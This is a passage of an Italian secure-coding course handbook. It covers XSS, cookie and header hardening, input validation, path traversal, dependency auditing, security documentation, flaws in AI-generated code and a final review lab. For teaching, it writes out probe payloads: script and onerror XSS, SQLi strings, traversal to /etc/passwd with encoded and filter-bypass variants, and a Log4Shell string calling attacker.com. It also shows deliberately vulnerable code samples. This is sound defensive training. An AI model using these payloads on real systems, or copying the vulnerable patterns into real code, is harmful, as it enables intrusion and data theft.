**Parte 1 — XSS**. Estendi `bancapiccola-mini` con un endpoint `/cerca?q=...` che mostra `q` nella pagina senza escape. Tutti provano l'attacco `<script>alert('XSS')</script>` e vedono l'alert. Modifica il codice per usare Jinja2 (`render_template`) invece di concatenazione di stringhe. Riprova l'attacco: lo script viene mostrato come testo letterale, non eseguito.

Aggiungi un sistema di commenti vulnerabile a Stored XSS. Posta un commento con payload. Modifica il template per usare `{{ comment }}` (escape automatico) invece di `{{ comment | safe }}`. Riprova: lo script viene mostrato come testo.

**Parte 2 — Header e cookie**. Aggiungi al `app.py` la configurazione dei cookie sicuri (vedi sopra). Verifica con DevTools del browser: la scheda Application → Cookies mostra `Secure` e `HttpOnly` attivi.

Visita **securityheaders.com** dal browser, inserisci `https://github.com`. Annota il voto (A). Confronta con un altro sito di tua scelta. Aggiungi al tuo Flask gli header mancanti tramite Flask-Talisman:

```python
from flask_talisman import Talisman
Talisman(app)
```

## 5.14 Cosa portarti via dalla Lezione 5

Primo: **XSS = JavaScript dell'attaccante eseguito nel browser della vittima**. Account takeover senza password.

Secondo: **Reflected, Stored, DOM-based**. Tre tipi. Stored è il più grave.

Terzo: **Jinja2 fa escape di default**. Non disabilitarlo con `|safe` su input utente.

Quarto: **bleach** per HTML ricco voluto.

Quinto: **HttpOnly + Secure + SameSite** sui cookie di sessione.

Sesto: **Sei header HTTP di sicurezza**. Configurarli costa un'ora, evita disastri.

## 5.15 Errori comuni

- Usare `|safe` "per fare prima" sul testo dell'utente. Risultato garantito: XSS.
- Dimenticare `HttpOnly` sul cookie di sessione: lo XSS può rubarlo.
- Configurare CSP troppo permissiva ("`script-src 'self' 'unsafe-inline'`"). `'unsafe-inline'` annulla la CSP. Usa nonce o hash.

---

# Capitolo 6 — Validazione input e supply chain (Lezione 6, 2h)

## 6.1 Cosa imparerai

- La differenza tra validation, sanitization e encoding.
- Perché **whitelist** è meglio di **blacklist**.
- Come usare **Pydantic** per validare strutturalmente gli input in Python.
- Cos'è **Path Traversal** e come si corregge.
- Cos'è la **supply chain** del software e come scoprire CVE nelle dipendenze con `pip-audit`.

## 6.2 Validation, sanitization, encoding — chi fa cosa

Tre operazioni che spesso vengono confuse:

**Validation** = verifica che l'input rispetti regole (tipo, formato, range). Se non rispetta, rifiuta. Esempio: "l'età deve essere un intero tra 0 e 150".

**Sanitization** = modifica l'input per renderlo sicuro, mantenendo il dato. Esempio: rimuovere tag `<script>` da un commento HTML mantenendo `<b>` e `<i>`.

**Encoding** = trasforma l'output a seconda del contesto. Esempio: HTML escape di una stringa prima di inserirla in una pagina.

Quando si applica cosa? Regola d'oro:

- **Validate** all'entrata (rifiuta input invalidi)
- **Encode** all'uscita (proteggi dal contesto: HTML, SQL, shell, JSON)
- **Sanitize** solo se l'input deve mantenere struttura ricca (HTML, markdown)

## 6.3 Whitelist vs Blacklist

Abbiamo già visto nel Cap 3 perché filtrare i caratteri pericolosi (blacklist) non funziona. Lo riprendiamo in modo generale.

**Blacklist** = "blocco questi caratteri". Esempio: `s = s.replace("'", "")`. Problema: liste sempre incomplete, l'attaccante è creativo.

**Whitelist** = "accetto solo questi". Esempio: regex `^[a-zA-Z0-9_]{3,20}$` per username. Vantaggi: definito, controllato, esplicito.

**Regola**: whitelist sempre. Blacklist mai (eccezione: filtri assistiti come WAF, in defense-in-depth).

## 6.4 Pydantic: validation strutturata in Python

In Python moderno la validation si fa con **Pydantic**, una libreria che combina type hints e validation. È lo standard de facto di FastAPI.

Installazione:

```bash
pip install pydantic[email]
```

Esempio. Vuoi validare il form di registrazione di un'app:

```python
from pydantic import BaseModel, EmailStr, Field, field_validator
from datetime import date

class UserCreate(BaseModel):
    username: str = Field(min_length=3, max_length=20,
                           pattern=r"^[a-zA-Z0-9_]+$")
    email: EmailStr
    age: int = Field(ge=18, le=120)
    password: str = Field(min_length=12)
    birthdate: date

    @field_validator("password")
    @classmethod
    def password_strength(cls, v):
        if not any(c.isupper() for c in v):
            raise ValueError("manca lettera maiuscola")
        if not any(c.isdigit() for c in v):
            raise ValueError("manca numero")
        return v

    @field_validator("birthdate")
    @classmethod
    def adult(cls, v):
        from datetime import date
        if (date.today() - v).days < 18*365:
            raise ValueError("devi essere maggiorenne")
        return v
```

Uso:

```python
try:
    user = UserCreate(**request.json)
except ValidationError as e:
    return jsonify({"errors": e.errors()}), 400
```

Cosa fa Pydantic per te:

- Controlla i tipi (se non sono come dichiarati, errore).
- Controlla i vincoli (lunghezza, range, regex).
- Esegue i validator custom.
- Restituisce errori dettagliati con path JSON ("birthdate: età minima 18").
- Genera automaticamente lo schema JSON Schema (per OpenAPI).

Equivalenti in altri linguaggi: **Bean Validation** in Java (`@Email`, `@Min`, `@NotNull`), **Zod** in TypeScript, **Symfony Validator** in PHP.

## 6.5 Esempi specifici di validation per tipo di dato

**Email**: in Pydantic, `EmailStr`. Mai scrivere regex per email a mano (lo standard RFC 5322 è impossibile da implementare correttamente con regex semplici).

**URL**: in Pydantic, `HttpUrl`. Oppure `urllib.parse.urlparse` con whitelist di schemi.

**Numeri di carta, IBAN, codice fiscale**: usa librerie specializzate (`schwifty` per IBAN, `python-codicefiscale` per CF). Mai regex.

**File upload**: questo merita una sezione a parte.

## 6.6 Validazione file upload

Quando un utente carica un file, devi validare:

1. **Estensione** (whitelist: solo `.pdf`, `.jpg`, `.png`).
2. **Dimensione massima** (es. 5 MB).
3. **MIME type reale** — **non** quello dichiarato dal client (è spoofabile). Usa la libreria `python-magic` che legge i magic bytes del file.
4. **Contenuto effettivo** — per immagini, usa Pillow per verificare che sia davvero un'immagine valida.

Esempio:

```python
import magic
from PIL import Image
import io

def validate_image(content: bytes, max_size: int = 5*1024*1024) -> dict:
    if len(content) > max_size:
        raise ValueError("file troppo grande")

    mime = magic.from_buffer(content, mime=True)
    if mime not in {"image/png", "image/jpeg"}:
        raise ValueError(f"MIME non ammesso: {mime}")

    img = Image.open(io.BytesIO(content))
    img.verify()
    return {"mime": mime, "size": len(content)}
```

## 6.7 Path Traversal

Path traversal è una vulnerabilità classica negli endpoint che servono file dall'input dell'utente.

Codice vulnerabile:

```python
@app.route("/download")
def download():
    filename = request.args.get("file")
    return send_file(f"./uploads/{filename}")
```

Attacco: `GET /download?file=../etc/passwd`. La path costruita è `./uploads/../etc/passwd`, che il sistema operativo risolve a `/etc/passwd`. L'attaccante legge un file di sistema.

Variazioni:

- `../../etc/passwd` (più livelli)
- `....//....//etc/passwd` (bypass di filtri ingenui che rimuovono `../`)
- `..%2f..%2fetc%2fpasswd` (URL-encoded)
- `..\Windows\System32\drivers\etc\hosts` (su Windows)

Correzione: tre controlli obbligatori.

```python
import os
from flask import abort, send_from_directory

UPLOAD_DIR = os.path.realpath("./uploads")
ALLOWED_EXTS = {".pdf", ".png", ".jpg", ".jpeg"}

@app.route("/download")
@login_required
def download():
    filename = request.args.get("file", "")

    # 1) Whitelist: solo nome file, no separatori
    if "/" in filename or "\\" in filename or filename.startswith("."):
        abort(400)

    # 2) Whitelist estensione
    ext = os.path.splitext(filename)[1].lower()
    if ext not in ALLOWED_EXTS:
        abort(400)

    # 3) Risolvi path completo e verifica che sia dentro UPLOAD_DIR
    full_path = os.path.realpath(os.path.join(UPLOAD_DIR, filename))
    if not full_path.startswith(UPLOAD_DIR + os.sep):
        abort(403)

    return send_from_directory(UPLOAD_DIR, filename, as_attachment=True)
```

Quattro righe di controllo. Tre attacchi neutralizzati.

## 6.8 Supply chain: il rischio nascosto

Adesso cambiamo argomento. Parliamo di **supply chain**, cioè la catena di approvvigionamento del software.

La tua app non è fatta solo dal codice che scrivi tu. Importa decine, centinaia di **librerie esterne**. Flask importa Werkzeug, che importa altri pacchetti, e così via. Un progetto Python medio ha 50-200 dipendenze indirette.

Ogni dipendenza è codice scritto da qualcun altro. Se ha una CVE, la tua app è vulnerabile. Esempio: Equifax (Cap 1) è stata bucata da una CVE in Apache Struts, una loro dipendenza.

## 6.9 Caso reale — Log4Shell 2021

Dicembre 2021: viene pubblicata CVE-2021-44228 in **Log4j**, una libreria di logging Java usata praticamente ovunque. CVSS: 10.0. Una semplice stringa in un header HTTP (`${jndi:ldap://attacker.com/x}`) permetteva di eseguire codice arbitrario sul server.

Per due settimane, mezza Internet ha patchato in emergenza. Aziende che avevano **inventario delle dipendenze** (SBOM) hanno identificato in 5 minuti dove erano vulnerabili. Aziende che non l'avevano hanno cercato per settimane.

## 6.10 Lo strumento: pip-audit

Per Python esiste un tool gratuito che scansiona le tue dipendenze e ti dice quali hanno CVE note: **pip-audit**.

```bash
pip install pip-audit
pip-audit
```

Output esempio:

```
Found 2 known vulnerabilities in 1 package
Name   Version  ID                  Fix Versions
flask  2.0.0    GHSA-m2qf-hxjv-5gpq  2.2.5
flask  2.0.0    GHSA-4j93-pq9p-vpc2  2.3.2
```

Significa: la tua versione di Flask (2.0.0) ha due CVE note, aggiorna a 2.3.2 (o superiore).

Strumenti equivalenti per altri linguaggi:

- **npm audit** per Node.js.
- **OWASP Dependency-Check** per Java/Maven.
- **Snyk** (commerciale, multi-linguaggio).
- **Dependabot** (GitHub built-in, apre PR automatiche di aggiornamento).

## 6.11 SBOM: l'inventario delle dipendenze

SBOM sta per *Software Bill of Materials*. È un file (in formato standardizzato come **CycloneDX** o **SPDX**) che elenca **tutte** le dipendenze del tuo software, con versioni e hash.

Perché è importante? Quando esce una CVE, hai bisogno di sapere in 5 minuti se la tua app è vulnerabile. Con un SBOM aggiornato, basta una query.

Strumento Python per generare SBOM:

```bash
pip install cyclonedx-bom
cyclonedx-py environment -o sbom.json
```

Dal **dicembre 2027**, il **Cyber Resilience Act** dell'Unione Europea renderà l'SBOM **obbligatorio** per ogni prodotto digitale venduto in UE. Se vuoi vendere un'app o un dispositivo IoT in Italia, dovrai pubblicare il tuo SBOM.

## 6.12 Laboratorio della Lezione 6

In aula, tre mini-lab:

**Lab 1 — Pydantic**. Scrivi un endpoint Flask `/register` che accetta JSON con `username`, `email`, `password`, `birthdate`, e validalo con Pydantic. Prova casi limite: email malformata, username con caratteri speciali, minorenne. Verifica che vengano rifiutati con messaggi chiari.

**Lab 2 — Path Traversal**. Aggiungi all'app un endpoint `/download?file=...` vulnerabile. Provalo con `?file=../app.py` e vedi che restituisce il codice sorgente. Correggi con i tre controlli del paragrafo 6.7. Riprova: 403.

**Lab 3 — pip-audit**. Crea un `requirements.txt` con una versione vecchia di Flask:

```
flask==2.0.0
```

Installa, lancia `pip-audit`. Annota le CVE. Aggiorna a `flask>=3.0`. Rilancia. Zero CVE.

## 6.13 Cosa portarti via dalla Lezione 6

Primo: **validation/sanitization/encoding** sono tre cose diverse. Sapere quale serve quando.

Secondo: **whitelist sempre**. Blacklist mai.

Terzo: **Pydantic** in Python (o Bean Validation in Java, Zod in TS).

Quarto: **path traversal** = tre controlli: niente separatori, whitelist estensione, `realpath` + `startswith`.

Quinto: **pip-audit** in CI. Le tue dipendenze sono codice di altri, può avere CVE.

Sesto: **SBOM** obbligatorio dal 2027 con il CRA.

## 6.14 Errori comuni

- "Valido lato client con JavaScript, basta così". No: chiunque può bypassare il JS con curl. Sempre validation server-side.
- Pensare che importare una libreria popolare sia automaticamente sicuro. Anche le librerie popolari hanno CVE (vedi Log4j).
- Lasciar passare mesi senza aggiornare le dipendenze. Le CVE escono ogni settimana.

---

# Capitolo 7 — Documentazione di sicurezza e uso responsabile dell'IA (Lezione 7, 2h)

## 7.1 Cosa imparerai

- Perché documentare i controlli di sicurezza non è burocrazia, ma un requisito.
- Come strutturare un documento `SECURITY.md` per un progetto.
- Come l'IA può aiutarti a scrivere codice (e dove invece può fregarti).
- I sette errori tipici del codice generato da IA.
- Quando NON usare l'IA.

## 7.2 Perché documentare la sicurezza

Negli ultimi sei capitoli ti ho mostrato decine di pattern: query parametrizzate, ownership check, escape Jinja2, cookie Secure+HttpOnly+SameSite, pip-audit, e così via. Adesso fatti questa domanda: come faccio a **dimostrare** che la mia app ha tutti questi controlli?

Risposta: con un documento.

Non è burocrazia. È **un requisito legale**:

- **GDPR Art. 32** chiede "misure tecniche e organizzative adeguate". Devi poterle elencare.
- **NIS 2 Art. 21** chiede 10 categorie di misure documentate.
- **Cyber Resilience Act** (2027) chiede documentazione tecnica per ogni prodotto.

E **un requisito operativo**:

- Quando un nuovo sviluppatore entra nel team, ha bisogno di sapere cosa è stato fatto.
- Quando arriva un auditor, deve poter verificare in mezza giornata, non setacciando il codice.
- Quando capita un incidente, devi sapere dove stanno le contromisure attive.

## 7.3 Il template SECURITY.md

Il documento standard si chiama (per convenzione) `SECURITY.md`, va nella radice del repository, versionato con Git insieme al codice. Si compila **progressivamente** durante lo sviluppo, **non alla fine** (sennò è incompleto e bugiardo).

Struttura tipica in 9 sezioni:

1. **Informazioni generali** (nome progetto, versione, owner, dati trattati, norme applicabili).
2. **Threat model** (DFD + tabella STRIDE con minacce e mitigazioni — vedi Cap 2).
3. **Controlli applicati** (autenticazione, autorizzazione, input validation, output, header HTTP, cifratura, gestione segreti, DB, logging, supply chain, CI/CD, network).
4. **Vulnerabilità note e debiti tecnici** (trasparenza: cosa sapete che è ancora debole).
5. **Test di sicurezza** (test automatici, pentest fatti).
6. **Incident response** (contatti emergenza, playbook).
7. **Compliance** (GDPR, NIS 2, CRA).
8. **Approvazione e revisione** (chi ha firmato, prossima revisione).
9. **Allegati** (DPIA, report pentest, registro trattamenti).

Vedrai un template completo (`02_template_documentazione_sicurezza.docx`) distribuito in questa lezione.

## 7.4 Esempio di sezione compilata

Per dare un'idea concreta, ti mostro come si compila la sezione **3.1 Autenticazione** del template:

| Controllo | Stato | Dettaglio | Riferimento codice |
|-----------|-------|-----------|---------------------|
| Hashing password | ✅ Implementato | bcrypt cost=12 | `app/auth.py:42` |
| MFA | ⚠️ Parziale | TOTP solo per admin | `app/auth/mfa.py` |
| Rate limit login | ✅ Implementato | 5/min via flask-limiter | `app/__init__.py:18` |
| Risposta uniforme errori | ✅ Implementato | Stesso msg email/password | `app/auth.py:67` |
| Session ID rigenerato post-login | ✅ Implementato | Flask-Login default | |

Le icone (✅, ⚠️) servono per leggere a colpo d'occhio. Le righe con ⚠️ sono "debiti tecnici noti" che andranno chiusi in roadmap.

## 7.5 Collegamento con UF 7

Il modulo **UF 7 — Tecniche di redazione documentazione tecnica** del corso STEM ti dà le basi per scrivere bene questa documentazione: chiarezza, struttura, stile. Applica quei principi al template SECURITY.md.

Esercizio raccomandato: per il tuo **progetto di stage**, fin dall'inizio, mantieni un `SECURITY.md` compilato. Sarà uno degli output che porti in azienda. Fa una **differenza enorme** rispetto a chi consegna solo codice "che funziona".

## 7.6 La seconda metà del capitolo: l'IA

Adesso parliamo del tema più attuale: **come usare l'intelligenza artificiale per scrivere codice senza fare disastri**.

## 7.7 Il contesto

Nel 2026, scrivere codice senza assistenti AI è diventato raro. GitHub Copilot, ChatGPT, Claude, Cursor, Gemini Code Assist: praticamente ogni sviluppatore ne usa almeno uno. Sono **moltiplicatori di produttività**: ti scrivono boilerplate, ti suggeriscono pattern, ti aiutano nei refactor.

Ma c'è un problema. L'IA è addestrata su **miliardi di righe di codice pubblico**, **incluso codice vulnerabile**. Quando le chiedi "scrivi una funzione di login", l'IA ti risponde con un pattern *statisticamente plausibile*, che potrebbe essere il **pattern medio**, non il **pattern sicuro**.

Studi GitHub (2022) e Stanford (2023) hanno mostrato:

- ~40% dei suggerimenti Copilot in scenari di sicurezza contengono vulnerabilità.
- Gli sviluppatori che usano AI scrivono codice **leggermente meno sicuro** ma **più convinti** che sia sicuro (bias cognitivo).
- Gli stessi pattern degli anni 2000 (SQL injection con f-string!) vengono ancora suggeriti.

Tradotto: **l'IA non sa di sicurezza. Tu devi**.

## 7.8 I sette errori tipici del codice IA

Eccone sette che ho visto centinaia di volte nei suggerimenti delle IA:

**1. SQL Injection con f-string.**

```python
def get_user(user_id):
    cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
```

Perché lo suggerisce: è il pattern più frequente nel codice pubblico (anche se sbagliato).
Cosa fare: usa `?` placeholder.

**2. Hash deboli per password.**

```python
def hash_password(pwd):
    return hashlib.sha256(pwd.encode()).hexdigest()
```

Perché lo suggerisce: SHA-256 "sembra" sicuro (è un hash crittografico).
Cosa fare: usa bcrypt o Argon2id.

**3. Manca authorization check.**

```python
@app.route("/user/<int:uid>")
@login_required
def get_user(uid):
    return User.query.get(uid).to_dict()
```

Perché: l'IA vede `@login_required` e si accontenta.
Cosa fare: aggiungi ownership check.

**4. Template senza escape.**

```javascript
res.send(`<h1>Ciao ${req.query.name}</h1>`);
```

Cosa fare: usa template engine con escape (EJS, Handlebars, ecc.), mai concatenazione di stringhe.

**5. CORS troppo permissivo.**

```python
CORS(app, resources={r"/api/*": {"origins": "*"}})
```

Perché: è la "soluzione veloce" agli errori CORS.
Cosa fare: whitelist di origini precise.

**6. Eccezioni catch-all che falliscono in modo aperto.**

```python
try:
    if not is_authorized(user, resource):
        return 403
    return resource
except Exception:
    return resource  # 💥 fail OPEN
```

Cosa fare: in caso di errore nei controlli di sicurezza, **chiudi** (503 o 403), non aprire.

**7. Segreti hardcoded.**

```python
SECRET_KEY = "my-secret-key-change-me"
API_KEY = "sk-1234567890abcdef"
```

Perché: gli "esempi" nei dataset di training abbondano di placeholder.
Cosa fare: usa sempre variabili d'ambiente (`os.environ[...]`).

**Bonus 8 — Librerie inventate.** L'IA a volte "halluucina" e suggerisce import di librerie che non esistono. Esempio: `from python_super_security import sanitize`. Pericolo: gli attaccanti possono creare il pacchetto malevolo con quel nome dopo (attacco di **typosquatting**). Verifica sempre che la libreria esista su PyPI/npm.

## 7.9 Il workflow di validazione in 4 step

Quando l'IA ti propone un blocco di codice, **prima di accettarlo**, fai questo:

**Step 1 — Leggi e capisci** (30 secondi). Se non sapresti spiegare la logica a un collega in 1 minuto, **non accettarla**. Mai.

**Step 2 — Scansiona per pattern vulnerabili** (1 minuto). Cerca a vista: f-string in SQL? `os.system`/`eval`/`exec`? Concatenazione di HTML con input? Hash deboli per password? Cookie senza attributi? Endpoint senza auth/authz?

**Step 3 — Verifica contesto** (1-2 minuti). L'IA non conosce il tuo progetto. Il pattern suggerito è coerente con l'architettura? Le librerie suggerite sono quelle che usi davvero? La versione è corretta?

**Step 4 — Test e tool** (5-15 minuti). Lancia i test esistenti (regressione). Scrivi un test per il nuovo codice (felice + edge case). Lancia un linter di sicurezza (`bandit` per Python, `semgrep` per più linguaggi).

## 7.10 Prompting per la sicurezza

Il modo in cui chiedi all'IA influenza il codice che ottieni. Confronto:

❌ **Vago** (rischioso):
> "Scrivi un endpoint Flask per login"

✅ **Specifico** (più sicuro):
> "Scrivi un endpoint Flask `/login` POST che:
> - usa bcrypt per verificare la password,
> - risponde uniformemente '401 invalid credentials' per username/password sbagliati (no user enumeration),
> - implementa rate limit 5/minuto per IP,
> - imposta cookie session con Secure, HttpOnly, SameSite=Lax,
> - logga gli eventi auth (success/failure) in formato JSON strutturato"

L'IA con prompt specifico produce codice **vicino** a quello giusto. Con prompt vago, produce la versione media (spesso vulnerabile).

Tip pro: **usa l'IA come revisore**. Dopo aver scritto **tu** il codice, incollalo nell'AI con il prompt: *"Rivedi questo codice per vulnerabilità OWASP Top 10. Indica SQL Injection, XSS, IDOR, fail-open, segreti hardcoded."*. Ottieni una **seconda opinione**. Non è un audit, ma cattura le ovvietà.

## 7.11 Uso etico e legale

Tre temi importanti quando usi IA in azienda:

**Proprietà intellettuale**. Il codice suggerito può contenere frammenti simili a codice open source (anche con licenza viral come GPL). Per progetti personali è ok. Per codice production in aziende serie, definisci una **policy interna**: ad esempio, "permesso Copilot per codice non-core, vietato per codice di sicurezza critica".

**Privacy e segreti nei prompt**. Quando incolli codice in ChatGPT o Claude, stai inviando dati a un servizio esterno. **Mai incollare**:
- Password reali, API key, token.
- Dati personali di utenti reali.
- Strategie business confidenziali.
- Codice coperto da NDA.

Caso reale: **Samsung 2023**. Dipendenti incollarono codice proprietario in ChatGPT per debugging. OpenAI lo usò per training. **Codice leakato indirettamente**. Samsung dovette vietare l'uso di ChatGPT.

Soluzioni enterprise: **GitHub Copilot Business**, **ChatGPT Enterprise**, **Claude for Teams**, **AWS Bedrock / Azure OpenAI**. Versioni che non usano i prompt per training, dati nella tua tenant.

**EU AI Act** (in vigore 2024-2027). Per sistemi AI "ad alto rischio" (es. scoring credito, recruitment automatico) ci sono obblighi di documentazione, trasparenza, supervisione umana. Per chi **usa** AI per scrivere codice, nessun obbligo diretto, ma è bene conoscerne i concetti.

## 7.12 Quando NON usare l'IA

Ci sono casi in cui l'IA va evitata, anche se sembra rapida:

- **Crittografia "fatta in casa"**. Non chiedere all'IA di implementare un algoritmo di cifratura, un PRNG, un'autenticazione "custom". Usa librerie standard.
- **Codice di sicurezza critico**. Logica di authn/authz ad alto rischio, codice che processa input untrusted, codice in kernel/driver. Scrivi tu, fatti aiutare per il boilerplate, revisione umana obbligatoria.
- **Compliance e legale**. Privacy policy, cookie banner, calcolo fiscale, validazione documenti (codice fiscale, P.IVA, IBAN — usa librerie, non regex).
- **Quando NON sai validare**. Se è il tuo primo giorno con quel framework, non usare l'IA come ghost-writer: non hai gli strumenti per giudicare il codice generato. Imparalo prima.

L'IA dovrebbe **accelerare** ciò che sai fare, non **sostituire** ciò che non sai.

## 7.13 Laboratorio della Lezione 7

In aula, due parti:

**Parte 1 — Documentazione**. Distribuzione del template `02_template_documentazione_sicurezza.docx`. A coppie, iniziate a compilare il vostro `SECURITY.md` per il progetto di stage. Compilate **almeno** le sezioni 1 e 2 (informazioni generali + threat model con DFD).

**Parte 2 — Validazione codice IA**. Il docente proietta uno snippet generato da ChatGPT (esempio):

```python
@app.route("/api/profile/<int:user_id>", methods=["PUT"])
def update_profile(user_id):
    data = request.json
    user = User.query.get(user_id)
    for key, value in data.items():
        setattr(user, key, value)
    db.session.commit()
    return jsonify(user.to_dict())
```

La classe identifica quante vulnerabilità ci sono (almeno 5):

1. Nessuna authentication richiesta.
2. IDOR (cambio `user_id`).
3. Mass Assignment (l'utente può impostare `role: admin`).
4. Nessuna input validation.
5. `to_dict()` espone tutti i campi (probabilmente anche `password_hash`).

Discussione: come correggere? Riscrittura collettiva alla lavagna.

## 7.14 Cosa portarti via dalla Lezione 7

Primo: **documentare la sicurezza è un requisito**, non un favore.

Secondo: `SECURITY.md` **versionato con il codice**.

Terzo: **l'IA è uno strumento potente, non un revisore di sicurezza**. Fidati, ma verifica.

Quarto: **i 7 errori tipici** del codice IA — riconoscili a vista.

Quinto: **prompting specifico** = output più sicuro.

Sesto: **mai segreti nei prompt**.

## 7.15 Errori comuni

- Compilare `SECURITY.md` alla fine "perché ora si chiude il progetto". Inutile e bugiardo.
- Accettare codice IA senza capirlo. È peggio di scriverlo da soli.
- Usare l'AI per scrivere crittografia: vulnerabilità garantita.

---

# Capitolo 8 — Lab integrato + verifica finale (Lezione 8, 2h)

## 8.1 Cosa farai

Hai finito le sette lezioni teorico-pratiche. Sai cosa è una SQL Injection, sai correggerla; sai cosa è un IDOR, sai correggerlo; sai cosa è un XSS, sai difenderti; sai come si hashano le password, come si validano gli input, come si gestisce la supply chain.

In questa lezione **applichi tutto**, su un'app vera, in 80 minuti. Sei un "junior security analyst" e ti viene affidata una piccola app per una review di sicurezza prima del rilascio.

## 8.2 Scenario

Il docente ti consegna il codice sorgente di un'app fittizia ("BancaPiccola" o simile). L'app è stata sviluppata e ti viene chiesto di revisionare per:

- Identificare **almeno 3 vulnerabilità**.
- Per ciascuna: descrizione, **Proof of Concept** funzionante, **fix proposto** in codice, severity giustificata, categoria OWASP, eventuale norma violata.
- Output: un mini-report (1-2 pagine, formato libero — Markdown, Word, PDF).

## 8.3 Le regole

Cosa puoi fare:
- Leggere il codice sorgente (non è un CTF cieco).
- Usare DevTools del browser, curl, sqlite3, DB Browser, qualunque tool del corso.
- Lavorare a coppie (ma report individuali).
- Chiedere **un hint** al docente (gratis). Il secondo hint costa 5% sul voto.
- Consultare le tue dispense.

Cosa non puoi fare:
- Aprire la versione corretta dell'app prima della consegna.
- Cercare su Google la soluzione specifica.
- Copiare il report da un compagno.

## 8.4 Cheat-sheet di campo

Distribuito stampato a inizio lezione. Riassume dove cercare:

```
Vuoi cercare SQL Injection?
   → Form di login, ricerca, qualunque parametro che finisce in WHERE.
   → Test rapidi: '   ' OR '1'='1   admin' --

Vuoi cercare IDOR?
   → URL con ID numerici (es. /fattura/42, /utente/3).
   → Cambia l'ID, vedi se accedi.

Vuoi cercare XSS?
   → Campi di testo "rivisualizzati" (commenti, profilo, ricerca).
   → Test rapidi: <script>alert(1)</script>   <img src=x onerror=alert(1)>

Vuoi cercare Crypto Failures?
   → Apri il DB con DB Browser. Le password sono in chiaro? MD5? bcrypt?

Vuoi cercare Path Traversal?
   → Endpoint che servono/scaricano file. Param "filename" o simile.
   → Test rapidi: ../etc/passwd    ../app.py
```

E per i "bonus":

```
Cookie senza HttpOnly/Secure/SameSite?
   → DevTools → Application → Cookies → guarda la riga "session"

Header di sicurezza mancanti?
   → DevTools → Network → guarda response headers
   → curl -I http://localhost:5000

CVE nelle dipendenze?
   → pip-audit -r requirements.txt
```

## 8.5 Tempistica della lezione

| Tempo | Attività |
|-------|----------|
| 0:00 – 0:10 | Briefing del docente, distribuzione codice e cheat-sheet |
| 0:10 – 1:30 | **Lavoro individuale o a coppie** — 80 minuti |
| 1:30 – 1:50 | **Discussione collettiva** — ognuno presenta una vulnerabilità + il proprio fix |
| 1:50 – 2:00 | **Chiusura corso** — riassunto, takeaway, prossimi passi |

## 8.6 Griglia di valutazione

Il mini-report viene valutato su 100 punti:

| Voce | Peso |
|------|------|
| Numero vulnerabilità identificate (≥3 = sufficiente, 5+ = ottimo) | 25 |
| Correttezza tecnica dei Proof of Concept | 30 |
| Qualità dei fix proposti (codice corretto, idiomatico) | 30 |
| Severity giustificata coerentemente | 10 |
| Mapping OWASP / norma violata | 5 |

Soglia di sufficienza: **60/100**.

## 8.7 Indicatori di un report eccellente

Cosa distingue un report ottimo da uno sufficiente:

- Ha trovato **almeno una vulnerabilità "bonus"** (cookie senza HttpOnly, CVE in `requirements.txt`, header mancanti).
- Le proof of concept sono **riproducibili passo passo** (un altro collega può rieseguirle).
- I fix non sono solo "patch puntuale" ma includono raccomandazioni architetturali.
- Cita correttamente articoli **GDPR/NIS 2** dove applicabile.
- Ha un **executive summary** chiaro: in 3 frasi spiega cosa hai trovato e cosa raccomandi.

## 8.8 Cosa portarti via dalla Lezione 8 (e dal corso)

Hai finito. Cosa porti a casa, in 5 punti che ti restano tra 5 anni:

**Primo**: la sicurezza si progetta dall'inizio. Non si aggiunge alla fine.

**Secondo**: defense in depth sempre. Mai una sola difesa.

**Terzo**: mentalità avversaria. Ogni riga di codice: cosa fa che non dovrebbe?

**Quarto**: i fondamentali tecnici di OWASP Top 10 — SQLi, IDOR, crypto, XSS, supply chain, path traversal. Li riconosci a vista, li correggi a memoria.

**Quinto**: documenta, testa, automatizza. Un controllo che non è testato è un controllo che si romperà.

## 8.9 Per crescere ancora

Sei junior. Hai le fondamenta solide. Per crescere:

**Risorse gratuite**:
- **PortSwigger Web Security Academy** (portswigger.net/web-security): il miglior corso gratuito al mondo, con lab guidati.
- **TryHackMe** (tryhackme.com): beginner friendly.
- **HackTheBox starting point**: più hard ma cresci tanto.
- **OWASP** (owasp.org): cheat sheets, top 10, ASVS.

**Certificazioni "entry"**:
- **CompTIA Security+** (vendor neutral).
- **eJPT** (eLearnSecurity, hands-on).
- **PortSwigger BSCP** (web/AppSec focus).

**In azienda**: probabilmente nessuno ti chiederà esplicitamente "fai sicurezza". Sarà compito **tuo** alzarsi e dirla. Quando vedi una query concatenata, una password in MD5, un endpoint senza authz — alza la mano. È quello che ti porterà davanti agli altri junior.

---

# Appendice A — Comandi e snippet di pronto utilizzo

### Setup ambiente Python in 5 comandi

```bash
mkdir progetto && cd progetto
python -m venv .venv
.\.venv\Scripts\Activate.ps1     # Windows
# source .venv/bin/activate        # macOS/Linux
pip install flask pydantic[email] bcrypt bleach pip-audit
```

### Query parametrizzata (Cap 3)

```python
# sqlite3
cur.execute("SELECT * FROM users WHERE id = ?", (user_id,))

# psycopg2 (PostgreSQL)
cur.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

### Ownership check (Cap 4)

```python
f = Fattura.query.filter_by(
    id=fid, owner_id=session["user_id"]
).first_or_404()
```

### bcrypt (Cap 4)

```python
import bcrypt
h = bcrypt.hashpw(pwd.encode(), bcrypt.gensalt(rounds=12))
ok = bcrypt.checkpw(input_pwd.encode(), h)
```

### Cookie sicuri Flask (Cap 5)

```python
app.config.update(
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE="Lax",
)
```

### Pydantic minimal (Cap 6)

```python
from pydantic import BaseModel, EmailStr, Field
class UserCreate(BaseModel):
    email: EmailStr
    password: str = Field(min_length=12)
```

### Path traversal safe (Cap 6)

```python
import os
UPLOAD = os.path.realpath("./uploads")
full = os.path.realpath(os.path.join(UPLOAD, filename))
if not full.startswith(UPLOAD + os.sep):
    abort(403)
```

### Scansione dipendenze (Cap 6)

```bash
pip install pip-audit
pip-audit
```

---

# Appendice B — Riferimenti normativi (sintesi)

| Articolo | Cosa richiede |
|----------|---------------|
| **GDPR Art. 5** | Principi: minimizzazione, integrità, riservatezza |
| **GDPR Art. 25** | Privacy by Design and by Default |
| **GDPR Art. 32** | Misure tecniche adeguate (cifratura, pseudonimizzazione, backup, test regolari) |
| **GDPR Art. 33-34** | Notifica breach al Garante entro 72h |
| **NIS 2 Art. 21** | 10 categorie di misure di gestione del rischio (cifratura, MFA, supply chain, formazione...) |
